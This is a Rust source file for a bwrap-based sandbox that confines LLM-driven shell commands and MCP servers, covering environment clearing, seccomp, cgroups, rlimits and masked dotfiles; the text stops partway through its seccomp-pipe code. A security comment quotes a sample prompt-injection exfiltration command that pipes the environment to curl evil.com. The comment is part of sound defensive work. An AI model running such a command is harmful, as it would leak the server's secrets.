//! bwrap invocation + always-on hardening for the code sandbox.
//!
//! Design rationale and validated flag set for the bwrap + always-on
//! hardening. Every flag here has a test row in the empirical-
//! validation table.

// Linux-only execution primitives — gated so the crate compiles on
// macOS/Windows (where execution goes through the VM / WSL2 backend).
#[cfg(target_os = "linux")]
use std::os::fd::{AsRawFd, IntoRawFd, RawFd};
// tokio::process::Command's `pre_exec` is its own method (unix-gated
// internally); the std::os::unix::process::CommandExt re-export isn't
// needed here.
use std::path::{Path, PathBuf};
#[cfg(target_os = "linux")]
use std::process::Stdio;
use std::sync::Arc;
#[cfg(target_os = "linux")]
use std::time::{Duration, Instant};

use tokio::io::{AsyncRead, AsyncReadExt};
#[cfg(target_os = "linux")]
use tokio::process::Command;
#[cfg(target_os = "linux")]
use tokio::time::timeout;
use uuid::Uuid;

use crate::common::AppError;
use crate::modules::code_sandbox::types::{
    CgroupMode, CodeSandboxState, HardeningCapabilities, PidNsMode, SandboxContext, SeccompMode,
};

/// Output of a single bwrap invocation. stdout/stderr are each
/// capped at [`OUTPUT_CAP_BYTES`]; bytes past the cap are drained
/// from the pipe and discarded (a truncation marker is appended to
/// the captured output, and `*_truncated: true` is set on the
/// returned JSON). The child is NOT killed when the cap is reached —
/// it can keep running and producing output until natural exit or the
/// wall-clock [`DEFAULT_TIMEOUT_SECS`] expires, at which point a
/// SIGKILL is sent. This keeps a noisy-but-correct workload from
/// being aborted just because it logged a lot, while still bounding
/// total CPU via the timeout.
#[derive(Debug, Clone)]
pub struct SandboxRunResult {
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    pub stdout_truncated: bool,
    pub stderr_truncated: bool,
    pub duration_ms: u64,
    pub timed_out: bool,
}

/// Per-call output cap. Matches the plan's 1 MiB ceiling. Lifted to
/// a const so tests can assert behavior at the boundary without
/// re-encoding the magic number.
pub const OUTPUT_CAP_BYTES: usize = 1024 * 1024;

/// Default wall-clock timeout for `execute_command`. Other tool callers
/// pass a shorter timeout via `run_in_sandbox`.
pub const DEFAULT_TIMEOUT_SECS: u64 = 600;

/// Run a shell command inside a bwrap-isolated environment.
///
/// All flags are derived from `state.caps` (probed once at boot). The
/// per-call work here is:
///   1. Render argv (no probes; reads cached caps).
///   2. Optionally allocate a transient cgroup scope under
///      `caps.cgroup`'s delegated parent.
///   3. Optionally pipe the compiled seccomp filter bytes to a fd.
///   4. Spawn bwrap → wrap with tokio `timeout` → capture-with-cap.
///   5. Tear down cgroup scope on the way out.
#[cfg(target_os = "linux")]
#[tracing::instrument(
    name = "code_sandbox.exec",
    skip_all,
    fields(
        conversation_id = %ctx.conversation_id,
        user_id = %ctx.user_id,
        command_preview = preview(command, 80),
    ),
)]
pub async fn run_in_sandbox(
    state: &CodeSandboxState,
    ctx: &SandboxContext,
    command: &str,
    timeout_secs: Option<u64>,
    flavor: &str,
) -> Result<SandboxRunResult, AppError> {
    use crate::modules::code_sandbox::{cgroup, runtime_mount};

    // Lazy-mount the rootfs for this FLAVOR (squashfuse) + run
    // rootfs-dependent probes (pid_ns, schema). First call per flavor
    // pays ~200-300 ms; subsequent calls for the same flavor return
    // the cached HardeningCapabilities instantly. Per-flavor mounts
    // coexist — minimal and full both stay live once first used.
    let ensure = runtime_mount::ensure_rootfs_ready(state, flavor).await?;
    let caps = ensure.caps.clone();
    let rootfs_dir = ensure.mount_dir.clone();

    // Hold an inflight guard against the mounted artifact for the
    // duration of this exec session (Plan 5 Phase 3). A pin change
    // mid-exec sees inflight > 0 and waits to evict the mount until
    // this guard drops at function return.
    let _inflight = ensure.artifact_id.and_then(|id| {
        crate::modules::code_sandbox::version_manager::acquire_inflight(
            id,
            crate::modules::code_sandbox::version_manager::InflightKind::Exec,
        )
    });

    // Runtime-configurable resource caps (Plan 1 §6). Async fetch from the
    // singleton; first call after process start loads from DB, every later
    // call hits the in-process RwLock. Snapshot is an Arc so we drop the
    // lock before doing any work.
    let limits =
        crate::modules::code_sandbox::resource_limits_cache::get().await?;

    let workspace = ctx.workspace.clone();
    // Identity files live OUTSIDE the per-conversation workspace bind
    // (under `<workspace_root>/identity/`) so the sandboxed shell
    // cannot tamper with them via the workspace RW mount.
    let synthetic = SyntheticIdentity::ensure(&state.workspace_root)?;

    // Touch the per-conversation last-used sentinel so the workspace
    // reaper doesn't delete an active long-lived workspace. Without
    // this sentinel, the reaper only sees the directory mtime, which
    // does not update on file writes inside — a 30-day-old
    // conversation that's still in use would get reaped mid-flight.
    let _ = std::fs::write(
        workspace.join(".last_used"),
        chrono::Utc::now().timestamp().to_string(),
    );

    // Per-call cgroup scope, if available.
    let cgroup_scope = match &caps.cgroup {
        CgroupMode::Delegated(parent) => {
            Some(
                cgroup::CgroupScope::create(parent, ctx.conversation_id, &limits)
                    .map_err(|e| {
                        tracing::warn!(
                            "cgroup scope creation failed: {e}; continuing without cgroup"
                        );
                        e
                    })
                    .ok(),
            )
            .flatten()
        }
        CgroupMode::None => None,
    };

    // Per-call seccomp pipe.
    let seccomp_pipe = match &caps.seccomp {
        SeccompMode::Loaded(bpf) => Some(SeccompPipe::install(bpf.clone())?),
        SeccompMode::NotLinked | SeccompMode::Disabled => None,
    };

    let argv = build_bwrap_argv(
        &caps,
        &state.workspace_root,
        ctx,
        &rootfs_dir,
        command,
        synthetic.passwd_path(),
        synthetic.group_path(),
        synthetic.mask_path(),
        seccomp_pipe.as_ref().map(|p| p.target_fd()),
        &limits,
    );

    let started = Instant::now();
    let mut cmd = Command::new(&caps.bwrap_path);
    cmd.args(&argv);
    cmd.stdin(Stdio::null());
    cmd.stdout(Stdio::piped());
    cmd.stderr(Stdio::piped());
    cmd.kill_on_drop(true);

    // Attach the seccomp read-fd at the well-known target (we have to
    // dup2 in pre_exec because tokio::process::Command closes non-stdio
    // fds by default).
    if let Some(pipe) = seccomp_pipe.as_ref() {
        let source_fd = pipe.read_fd();
        let target_fd = pipe.target_fd();
        // SAFETY: dup2 is async-signal-safe; we don't allocate or hold
        // locks. The source fd is owned by SeccompPipe and remains
        // valid through cmd.spawn().
        unsafe {
            cmd.pre_exec(move || {
                if libc::dup2(source_fd, target_fd as RawFd) < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                // Clear FD_CLOEXEC so the fd survives execve into bwrap.
                let flags = libc::fcntl(target_fd as RawFd, libc::F_GETFD);
                if flags < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                if libc::fcntl(target_fd as RawFd, libc::F_SETFD, flags & !libc::FD_CLOEXEC) < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                Ok(())
            });
        }
    }

    // NOTE: we deliberately do NOT layer Landlock here. Applying a Landlock
    // ruleset to the bwrap process (it would persist across execve into the
    // workload) is keyed to the *inodes* of the host paths used to build it;
    // bwrap then creates a fresh tmpfs root + `--tmpfs /tmp` + `--dev /dev` +
    // `--proc /proc` whose inodes are under no granted hierarchy, so Landlock
    // would deny the workload's access to /tmp, /dev/null and / and break
    // essentially every command. The only workable Landlock would be an
    // in-rootfs helper applied AFTER bwrap's mounts — but that's a rootfs-
    // release change and is redundant with the mount namespace (the workload
    // already only sees the sandbox mounts; mount/remount syscalls are seccomp-
    // blocked). Filesystem confinement here is bwrap's mount-ns, not Landlock.

    let mut child = cmd
        .spawn()
        .map_err(|e| AppError::new(
            axum::http::StatusCode::INTERNAL_SERVER_ERROR,
            "BWRAP_SPAWN_FAILED",
            format!("failed to spawn bwrap: {e}"),
        ))?;

    // Attach the bwrap pid to the cgroup scope. (L2) This is post-spawn, so in
    // principle there's a window before the workload is in the cgroup — but in
    // practice bwrap's own setup (mount-ns construction, pivot, --proc/--dev)
    // runs before it execs prlimit→bash→workload, and that latency far exceeds
    // this attach, so the workload is in the cgroup before it starts. prlimit
    // (applied to the workload itself, not bwrap) is the always-on backstop
    // regardless. Not worth eliminating with unsafe pre_exec self-attach.
    if let Some(scope) = cgroup_scope.as_ref()
        && let Some(pid) = child.id()
            && let Err(e) = scope.attach_pid(pid) {
                tracing::warn!("cgroup attach_pid({pid}) failed: {e}");
            }

    let stdout = child.stdout.take().expect("stdout piped");
    let stderr = child.stderr.take().expect("stderr piped");

    let stdout_handle = tokio::spawn(read_capped_owned(stdout));
    let stderr_handle = tokio::spawn(read_capped_owned(stderr));

    // Hard wall-clock timeout. timeout=0 keeps the configured default.
    let budget = Duration::from_secs(
        timeout_secs.unwrap_or(limits.timeout_secs.max(1) as u64),
    );
    let wait_result = timeout(budget, child.wait()).await;

    let (timed_out, status) = match wait_result {
        Ok(Ok(s)) => (false, s.code().unwrap_or(-1)),
        Ok(Err(e)) => {
            return Err(AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "BWRAP_WAIT_FAILED",
                format!("wait on bwrap child failed: {e}"),
            ));
        }
        Err(_) => {
            // Timed out → SIGKILL. child.kill() is best-effort; even if
            // the bwrap parent is already dead the kernel will reap.
            let _ = child.start_kill();
            let _ = child.wait().await;
            (true, -1)
        }
    };

    // Drain capture tasks.
    let (stdout_buf, stdout_truncated) = stdout_handle
        .await
        .unwrap_or_else(|_| (Vec::new(), false));
    let (stderr_buf, stderr_truncated) = stderr_handle
        .await
        .unwrap_or_else(|_| (Vec::new(), false));

    let duration_ms = started.elapsed().as_millis() as u64;

    // Best-effort cgroup cleanup happens via Drop.
    drop(cgroup_scope);
    drop(seccomp_pipe);

    tracing::info!(
        exit_code = status,
        stdout_bytes = stdout_buf.len(),
        stderr_bytes = stderr_buf.len(),
        timed_out,
        duration_ms,
        "code_sandbox.exec complete",
    );

    Ok(SandboxRunResult {
        exit_code: status,
        stdout: lossy_string_with_marker(stdout_buf, stdout_truncated),
        stderr: lossy_string_with_marker(stderr_buf, stderr_truncated),
        stdout_truncated,
        stderr_truncated,
        duration_ms,
        timed_out,
    })
}

// --------------------------------------------------------------------
// argv construction
// --------------------------------------------------------------------

/// Shared parameters for building the hardening prefix of a bwrap
/// argv. Both the one-shot `build_bwrap_argv` and the long-lived
/// `build_mcp_sandbox_argv` build the SAME prefix (namespaces,
/// rootfs binds, identity, dotfile masks, PID-ns branch, /proc masks,
/// optional seccomp, terminating `--`) and only differ in the tail
/// (one-shot: `prlimit ... -- /bin/bash -lc <cmd>`; MCP: `prlimit ...
/// -- <resolved_cmd> <args...>`).
///
/// `home_bind_source` is the dir bound at `/home/sandboxuser` — for
/// one-shot it's the per-conversation workspace; for MCP it's the
/// per-server workspace (`<sandboxes>/mcp/<server_id>/`).
///
/// `extra_setenv` is layered AFTER the hard-coded HOME/USER/PATH/
/// LANG/LC_ALL/TERM block, so an MCP server's user-supplied env
/// (already filtered through `BLOCKED_ENV_VARS` at the call site)
/// reaches the workload without leaking host env.
///
/// `extra_ro_binds` is appended after the /proc masks (mirroring the
/// position attachment binds occupy in the one-shot path). For
/// one-shot it carries conversation attachments; for MCP it carries
/// the embedded uv/bun extraction dir + its parents.
pub(crate) struct HardeningArgvParams<'a> {
    pub caps: &'a HardeningCapabilities,
    pub rootfs_dir: &'a Path,
    pub passwd_path: &'a Path,
    pub group_path: &'a Path,
    pub mask_path: &'a Path,
    pub home_bind_source: &'a Path,
    pub seccomp_fd: Option<i32>,
    pub extra_setenv: &'a [(String, String)],
    pub extra_ro_binds: &'a [(String, String)],
}

/// Build the shared hardening prefix: every flag from `--clearenv`
/// through the terminating `--`, ready for the caller to append its
/// tail (prlimit + workload). See `HardeningArgvParams` for the
/// per-call inputs.
pub(crate) fn build_hardening_prefix(p: &HardeningArgvParams) -> Vec<String> {
    let rootfs = p.rootfs_dir.to_str().unwrap_or_default();
    let workspace = p.home_bind_source.to_string_lossy().to_string();

    let mut argv: Vec<String> = vec![
        // SECURITY: see comment block in build_bwrap_argv (the one-shot
        // call site historically owned this comment; preserved there).
        "--clearenv".into(),
        "--unshare-user".into(),
        "--uid".into(),
        "1001".into(),
        "--gid".into(),
        "1001".into(),
        "--unshare-uts".into(),
        "--unshare-ipc".into(),
        "--unshare-cgroup-try".into(),
        "--share-net".into(),
        "--new-session".into(),
        "--die-with-parent".into(),
        "--ro-bind".into(),
        format!("{rootfs}/usr"),
        "/usr".into(),
        "--ro-bind-try".into(),
        "/etc/ssl".into(),
        "/etc/ssl".into(),
        "--ro-bind-try".into(),
        format!("{rootfs}/etc/ssl"),
        "/etc/ssl".into(),
        // /etc/resolv.conf — required for any sandbox child that does
        // DNS (`uvx`, `npx`, `pip install`, `mcp-server-fetch`, …).
        // Prefer the host's resolv.conf (real production nameservers,
        // including any split-DNS setup); fall through to the rootfs's
        // baked-in public-resolver fallback. ro-bind-try silently skips
        // missing sources, so a host or rootfs without /etc/resolv.conf
        // simply means no DNS in the sandbox — no spawn failure.
        "--ro-bind-try".into(),
        "/etc/resolv.conf".into(),
        "/etc/resolv.conf".into(),
        "--ro-bind-try".into(),
        format!("{rootfs}/etc/resolv.conf"),
        "/etc/resolv.conf".into(),
        // /etc/alternatives is Debian's symlink-chain target for system-wide
        // tool choices — e.g. r-base-core resolves libblas.so.3 →
        // /etc/alternatives/libblas.so.3-* → libopenblas via this directory.
        // Without it, packages installed via the alternatives system (R, the
        // BLAS/LAPACK stack, default editor/pager, java/python provider
        // selection) fail at runtime even when the underlying libraries ARE
        // in the rootfs. ro-bind-try so the minimal rootfs (no alternatives)
        // is unaffected.
        "--ro-bind-try".into(),
        format!("{rootfs}/etc/alternatives"),
        "/etc/alternatives".into(),
        // /etc/R holds the R wrapper's ldpaths + Renviron — both sourced by
        // /usr/lib/R/bin/R at startup (the `ldpaths: No such file` error in
        // the reported transcript). Same ro-bind-try policy.
        "--ro-bind-try".into(),
        format!("{rootfs}/etc/R"),
        "/etc/R".into(),
        "--ro-bind".into(),
        p.passwd_path.display().to_string(),
        "/etc/passwd".into(),
        "--ro-bind".into(),
        p.group_path.display().to_string(),
        "/etc/group".into(),
        "--symlink".into(),
        "usr/bin".into(),
        "/bin".into(),
        "--symlink".into(),
        "usr/sbin".into(),
        "/sbin".into(),
        "--symlink".into(),
        "usr/lib".into(),
        "/lib".into(),
        "--symlink".into(),
        "usr/lib64".into(),
        "/lib64".into(),
        "--dev".into(),
        "/dev".into(),
        "--tmpfs".into(),
        "/tmp".into(),
        "--bind".into(),
        workspace,
        "/home/sandboxuser".into(),
        "--chdir".into(),
        "/home/sandboxuser".into(),
        "--setenv".into(),
        "HOME".into(),
        "/home/sandboxuser".into(),
        "--setenv".into(),
        "USER".into(),
        "sandboxuser".into(),
        "--setenv".into(),
        "PATH".into(),
        "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin".into(),
        "--setenv".into(),
        "LANG".into(),
        "C.UTF-8".into(),
        "--setenv".into(),
        "LC_ALL".into(),
        "C.UTF-8".into(),
        "--setenv".into(),
        "TERM".into(),
        "dumb".into(),
        // BLAS/LAPACK auto-detect every host CPU and spawn one thread per CPU
        // at startup. On a 64-core box that's 64 pthread_creates against the
        // sandbox's RLIMIT_NPROC=256, which OpenBLAS regularly loses (the
        // reported transcript hit this once libblas was findable). Single
        // thread is the right default for sandboxed scripted tasks; covers
        // OpenBLAS, BLIS, and Intel MKL with one knob each.
        "--setenv".into(),
        "OPENBLAS_NUM_THREADS".into(),
        "1".into(),
        "--setenv".into(),
        "OMP_NUM_THREADS".into(),
        "1".into(),
        "--setenv".into(),
        "MKL_NUM_THREADS".into(),
        "1".into(),
    ];

    // Caller-supplied env (MCP server config). Filtered upstream
    // against BLOCKED_ENV_VARS so secrets can't be reintroduced
    // through this hook. Empty for the one-shot path → no-op (and
    // therefore byte-identical to the legacy argv).
    for (k, v) in p.extra_setenv {
        argv.push("--setenv".into());
        argv.push(k.clone());
        argv.push(v.clone());
    }

    // Dotfile masks. See the long-form comment at the original call
    // site (one-shot) for rationale + the "regular file vs /dev/null"
    // nuance.
    let mask_src = p.mask_path.display().to_string();
    for dotfile in DANGEROUS_DOTFILES {
        argv.push("--ro-bind".into());
        argv.push(mask_src.clone());
        argv.push(format!("/home/sandboxuser/{dotfile}"));
    }

    // PID namespace + /proc handling per cached mode.
    match p.caps.pid_namespace {
        PidNsMode::Strict => {
            argv.push("--unshare-pid".into());
            argv.push("--as-pid-1".into());
            argv.push("--proc".into());
            argv.push("/proc".into());
        }
        PidNsMode::DevBindFallback => {
            argv.push("--dev-bind".into());
            argv.push("/proc".into());
            argv.push("/proc".into());
        }
        PidNsMode::Disabled => {}
    }

    // /proc-file masks (defense-in-depth in Strict, critical in
    // DevBindFallback).
    for masked in ["/proc/sysrq-trigger", "/proc/kcore", "/proc/kallsyms", "/proc/kmsg"] {
        argv.push("--ro-bind".into());
        argv.push("/dev/null".into());
        argv.push(masked.into());
    }

    // Caller-supplied ro-binds (one-shot: per-conversation
    // attachments; MCP: embedded uv/bun bin dir).
    for (host_src, sandbox_dst) in p.extra_ro_binds {
        argv.push("--ro-bind-try".into());
        argv.push(host_src.clone());
        argv.push(sandbox_dst.clone());
    }

    // Optional seccomp filter on a well-known fd we'll dup2 to.
    if let Some(fd) = p.seccomp_fd {
        argv.push("--seccomp".into());
        argv.push(fd.to_string());
    }

    // CVE-2024-32462 argument-injection defense: terminator BEFORE the
    // sub-command. Every user-controlled arg after this is data only.
    argv.push("--".into());

    argv
}

/// Build the bwrap argv for a long-lived MCP stdio server. Shares
/// the entire hardening prefix with `build_bwrap_argv`, then appends
/// `prlimit … -- <resolved_cmd> <args>` — NO `/bin/bash -lc` wrapper,
/// because rmcp will exchange JSON-RPC with this process over its
/// own stdin/stdout and a shell layer would corrupt the byte stream.
pub(crate) fn build_mcp_sandbox_argv(
    p: &HardeningArgvParams,
    resolved_cmd: &Path,
    resolved_args: &[String],
    limits: &crate::modules::code_sandbox::resource_limits::CodeSandboxResourceLimits,
) -> Vec<String> {
    let mut argv = build_hardening_prefix(p);
    argv.push("/usr/bin/prlimit".into());
    argv.push(format!("--nproc={}", limits.nproc_max));
    argv.push(format!("--as={}", limits.address_space_bytes));
    argv.push(format!("--fsize={}", limits.fsize_bytes));
    argv.push(format!("--nofile={}", limits.nofile_max));
    argv.push("--core=0".into());
    argv.push(format!("--cpu={}", limits.cpu_secs_max));
    argv.push("--".into());
    argv.push(resolved_cmd.display().to_string());
    for a in resolved_args {
        argv.push(a.clone());
    }
    argv
}

/// Exposed at crate level (via `lib.rs`) so the Tier-4 harness can
/// use the EXACT same argv the production code path uses. Without
/// this exposure the test harness had to maintain a parallel argv
/// builder that drifted from production (caught by Tier 6 in commit
/// 5823061 — the `--as-pid-1` gating bug).
pub(crate) fn build_bwrap_argv(
    caps: &HardeningCapabilities,
    // Root under which conversation attachments are staged. The Linux backend
    // passes the host workspace root; the macOS/Windows VM backends pass the
    // *guest* mount (so attachment binds resolve to guest paths) — this is the
    // only thing the argv builder needed from the old `state` param.
    workspace_root: &Path,
    ctx: &SandboxContext,
    rootfs_dir: &Path,
    user_cmd: &str,
    passwd_path: &Path,
    group_path: &Path,
    // Path to an empty regular file used as the bind source for the
    // DANGEROUS_DOTFILES masks. MUST be a normal file (NOT /dev/null) —
    // bwrap's `--ro-bind` inherits `nodev` and bash's `open()` of a char
    // device on a `nodev` mount returns EACCES, breaking `bash -l` when it
    // sources `.bash_profile`. Linux backend passes the synthetic-identity
    // dir's `empty`; macOS/WSL2 backends pass a guest-baked path (provisioned
    // alongside the synthetic passwd/group files).
    mask_path: &Path,
    // Raw fd number bwrap reads the seccomp filter from. Plain `i32` (not
    // `RawFd`) so this argv builder stays OS-independent and shared across
    // backends; only the Linux backend actually wires up the fd.
    seccomp_fd: Option<i32>,
    // Runtime-configurable resource caps (Plan 1 §6). Drives the prlimit
    // literals at the bottom; cgroup-side caps (memory.max / pids.max /
    // cpu.max) are applied by the cgroup module (Linux host) or by the
    // guest agent reading `ExecRequest.cgroup` (macOS / WSL2). The caller
    // resolves this via `resource_limits_cache::snapshot_or_defaults()`.
    limits: &crate::modules::code_sandbox::resource_limits::CodeSandboxResourceLimits,
) -> Vec<String> {
    // SECURITY (kept here for archaeology — the actual --clearenv flag
    // ships from `build_hardening_prefix`):
    //   wipe the entire inherited environment before any --setenv lines
    //   below. Without --clearenv, the server's full env (DATABASE_URL,
    //   JWT secrets, every *_API_KEY, HUGGINGFACE_API_KEY, AWS_*,
    //   OPENAI_*, ANTHROPIC_*, etc.) would be visible to the sandboxed
    //   bash. Combined with --share-net, a prompt-injection like
    //   `env > /tmp/x && curl evil.com -d @-` would exfiltrate every
    //   secret the server holds. With --clearenv, only the explicit
    //   --setenv values survive into the sandbox.

    // Conversation attachments are read-only-bound into the sandbox.
    // Skip filenames containing path separators or NUL — we already
    // store a basename, but defense-in-depth.
    let extra_ro_binds: Vec<(String, String)> = ctx
        .files
        .iter()
        .filter(|f| !f.filename.contains('/') && !f.filename.contains('\0'))
        .map(|f| {
            let host_path = workspace_attachment_path(workspace_root, f.file_id);
            (
                host_path.display().to_string(),
                format!("/home/sandboxuser/{}", f.filename),
            )
        })
        .collect();

    let mut argv = build_hardening_prefix(&HardeningArgvParams {
        caps,
        rootfs_dir,
        passwd_path,
        group_path,
        mask_path,
        home_bind_source: &ctx.workspace,
        seccomp_fd,
        extra_setenv: &[],
        extra_ro_binds: &extra_ro_binds,
    });

    // Wrap user code in `prlimit` so per-call rlimits apply to the
    // workload, not to bwrap's own helper forks (validated: setting
    // rlimits on bwrap itself starves bwrap). Values are
    // runtime-configurable via the `code_sandbox_settings` singleton.
    argv.push("/usr/bin/prlimit".into());
    argv.push(format!("--nproc={}", limits.nproc_max));
    argv.push(format!("--as={}", limits.address_space_bytes));
    argv.push(format!("--fsize={}", limits.fsize_bytes));
    argv.push(format!("--nofile={}", limits.nofile_max));
    argv.push("--core=0".into());
    argv.push(format!("--cpu={}", limits.cpu_secs_max));
    argv.push("--".into());
    argv.push("/bin/bash".into());
    argv.push("-lc".into());
    argv.push(user_cmd.to_string());

    argv
}


/// Per-file workspace path for a conversation attachment.
/// Files are staged under `<workspace_root>/attachments/<file_id>` by
/// the handler before bwrap fires, so the bind is read-only-safe.
pub fn workspace_attachment_path(workspace_root: &Path, file_id: Uuid) -> PathBuf {
    workspace_root.join("attachments").join(file_id.to_string())
}

// --------------------------------------------------------------------
// Synthetic passwd / group (per-call, lives inside the workspace,
// bind-mounted read-only over /etc/passwd /etc/group)
// --------------------------------------------------------------------

pub(crate) struct SyntheticIdentity {
    passwd: PathBuf,
    group: PathBuf,
    /// Empty regular file used as the bind source for the DANGEROUS_DOTFILES
    /// masks. Must be a normal file, NOT `/dev/null` — bwrap's `--ro-bind`
    /// passes through `nodev` and bash's `open()` of a character device on a
    /// `nodev` mount returns EACCES, which bash surfaces as "Permission
    /// denied" when sourcing `.bash_profile`. A 0-byte regular file reads
    /// cleanly (zero bytes, EOF) and writes still fail with EROFS.
    mask_path: PathBuf,
}

// pub(crate) so the WSL2 backend can provision identical synthetic identity
// files inside the imported distro (the macOS guest root bakes them in).
pub(crate) const SYNTHETIC_PASSWD: &str =
    "sandboxuser:x:1001:1001:Sandbox User:/home/sandboxuser:/bin/bash\n";
pub(crate) const SYNTHETIC_GROUP: &str = "sandboxuser:x:1001:\n";

/// Shell / runtime config files at the workspace root that an LLM-driven sandbox
/// command must NOT be able to read or write. Mirrors Anthropic sandbox-runtime's
/// `DANGEROUS_FILES` list (`src/sandbox/sandbox-utils.ts:11-22`). Each one is
/// either a shell-startup file (`.bashrc`, `.zshrc`, `.profile`, …) that the
/// host shell could source on next login, or a tool-config file (`.gitconfig`,
/// `.mcp.json`, …) that the LLM could subvert to alter outside-sandbox behavior
/// (e.g. credential helpers, MCP server URLs). Masking with `--ro-bind /dev/null`
/// makes every read appear empty AND every write fail with EROFS, regardless of
/// whether the file already exists in the workspace.
const DANGEROUS_DOTFILES: &[&str] = &[
    ".gitconfig",
    ".gitmodules",
    ".bashrc",
    ".bash_profile",
    ".zshrc",
    ".zprofile",
    ".profile",
    ".ripgreprc",
    ".mcp.json",
];

impl SyntheticIdentity {
    /// Lazily ensure the synthetic passwd/group files exist under
    /// `<workspace_root>/identity/` and return their paths.
    ///
    /// SECURITY: identity files live OUTSIDE the per-conversation
    /// workspace bind. The earlier implementation wrote them into
    /// `<workspace>/.sandbox_passwd`, which had two problems:
    ///   1. Two concurrent calls in the same conversation raced on the
    ///      write (mitigated by the per-conv mutex, but still fragile).
    ///   2. A user who did `write_file(".sandbox_passwd", payload)`
    ///      would have their data silently clobbered by the next
    ///      execute_command — surprising and a small data-loss vector.
    /// Moving the files to `<workspace_root>/identity/` makes them
    /// per-process (shared by every conversation) and the content is
    /// constant, so the write is idempotent: we only write if the
    /// file doesn't already exist or has the wrong content.
    fn ensure(workspace_root: &Path) -> Result<Self, AppError> {
        let identity_dir = workspace_root.join("identity");
        std::fs::create_dir_all(&identity_dir).map_err(|e| {
            AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "WORKSPACE_INIT_FAILED",
                format!("mkdir identity dir: {e}"),
            )
        })?;
        let passwd = identity_dir.join("passwd");
        let group = identity_dir.join("group");
        write_if_changed(&passwd, SYNTHETIC_PASSWD).map_err(|e| {
            AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "WORKSPACE_WRITE_FAILED",
                format!("write synthetic passwd: {e}"),
            )
        })?;
        write_if_changed(&group, SYNTHETIC_GROUP).map_err(|e| {
            AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "WORKSPACE_WRITE_FAILED",
                format!("write synthetic group: {e}"),
            )
        })?;
        let mask_path = identity_dir.join("empty");
        write_if_changed(&mask_path, "").map_err(|e| {
            AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "WORKSPACE_WRITE_FAILED",
                format!("write empty mask file: {e}"),
            )
        })?;
        Ok(Self { passwd, group, mask_path })
    }

    fn passwd_path(&self) -> &Path {
        &self.passwd
    }
    fn group_path(&self) -> &Path {
        &self.group
    }
    fn mask_path(&self) -> &Path {
        &self.mask_path
    }

    // Crate-public accessors exposed so the MCP-in-sandbox spawn path
    // (`build_mcp_sandbox_command`) can build a `HardeningArgvParams`
    // without redeclaring the identity-file ownership.
    pub(crate) fn ensure_for(workspace_root: &Path) -> Result<Self, AppError> {
        Self::ensure(workspace_root)
    }
    pub(crate) fn passwd(&self) -> &Path { &self.passwd }
    pub(crate) fn group(&self) -> &Path { &self.group }
    pub(crate) fn mask(&self) -> &Path { &self.mask_path }
}

/// Write `content` to `path` only if the file doesn't already exist
/// or has different content. Avoids redundant disk writes on every
/// sandbox call.
fn write_if_changed(path: &Path, content: &str) -> std::io::Result<()> {
    match std::fs::read_to_string(path) {
        Ok(existing) if existing == content => Ok(()),
        _ => std::fs::write(path, content),
    }
}

// --------------------------------------------------------------------
// Seccomp pipe (per-call). Bytes are precompiled at boot; we just
// shuttle them to a fd that bwrap reads via `--seccomp <fd>`.
// --------------------------------------------------------------------

#[cfg(target_os = "linux")]
pub(crate) struct SeccompPipe {
    read_fd: RawFd,
    /// Stable fd number we dup2 the read end to inside the bwrap child
    /// in pre_exec. We pick fd 7 (out of stdio range, plausibly free).
    target_fd: i32,
}

#[cfg(target_os = "linux")]
impl SeccompPipe {
    fn install(bpf: Arc<Vec<u8>>) -> Result<Self, AppError> {
        // pipe(2) via libc — nix would be cleaner but we avoid the dep
        // here to keep the surface small.
        let mut fds: [libc::c_int; 2] = [0; 2];
        let ret = unsafe { libc::pipe2(fds.as_mut_ptr(), libc::O_CLOEXEC) };
        if ret < 0 {
            return Err(AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "SECCOMP_PIPE_FAILED",
                format!("pipe2: {}", std::io::Error::last_os_error()),
            ));
        }
        let read_fd = fds[0];
        let write_fd = fds[1];

        // Push the BPF bytes from a tokio task so we don't deadlock if
        // they're bigger than the kernel pipe buffer (unlikely at <1KB
        // but cheap insurance).
        //
        // SECURITY: write must succeed in full. A short write (or
        // EINTR-interrupted partial write) would feed bwrap a
        // truncated BPF program, which libseccomp rejects → bwrap
        // exits non-zero. Worse: an undetected partial write at the
        // boundary could conceivably load a smaller filter that
        // blocks fewer syscalls than the planner intended. Loop on
        // EINTR / EAGAIN; on any other error or unexpected EOF
        // (write returned 0), log loudly so operators see the
        // hardening claim was not delivered for that call.
        let total = bpf.as_ref().len();
        tokio::spawn(async move {
            let bytes: &[u8] = bpf.as_ref();
            let mut offset = 0;
            let mut last_err: Option<i32> = None;
            while offset < bytes.len() {
                let n = unsafe {
                    libc::write(
                        write_fd,
                        bytes[offset..].as_ptr() as *const libc::c_void,
                        bytes.len() - offset,
                    )
                };
                if n > 0 {
                    offset += n as usize;
                    continue;
                }
                // n <= 0: either error or kernel said "no more room",
                // which on a pipe write means the reader closed —
                // unexpected for our use case.
                let errno = std::io::Error::last_os_error().raw_os_error().unwrap_or(0);
                if n < 0 && (errno == libc::EINTR || errno == libc::EAGAIN) {
                    continue;
                }
                last_err = Some(errno);
                break;
            }
            unsafe {
                libc::close(write_fd);
            }
            if offset < total {
                tracing::error!(
                    written = offset,
                    expected = total,
                    errno = ?last_err,
                    "code_sandbox: seccomp BPF write was truncated; \
                     bwrap will reject the filter and the sandboxed \
                     call WILL FAIL — hardening claim 'seccomp: on' \
                     was not delivered for this call"
                );
            }
        });

        Ok(Self {
            read_fd,
            target_fd: 7,
        })
    }

    fn read_fd(&self) -> RawFd {
        self.read_fd
    }
    fn target_fd(&self) -> i32 {
        self.target_fd
    }

    // Crate-public accessors used by the MCP-in-sandbox spawn path.
    // Keep the original `read_fd` / `target_fd` private so refactors of
    // the one-shot exec path don't accidentally expose new surface.
    pub(crate) fn install_pub(bpf: Arc<Vec<u8>>) -> Result<Self, AppError> {
        Self::install(bpf)
    }
    pub(crate) fn read_fd_pub(&self) -> RawFd { self.read_fd }
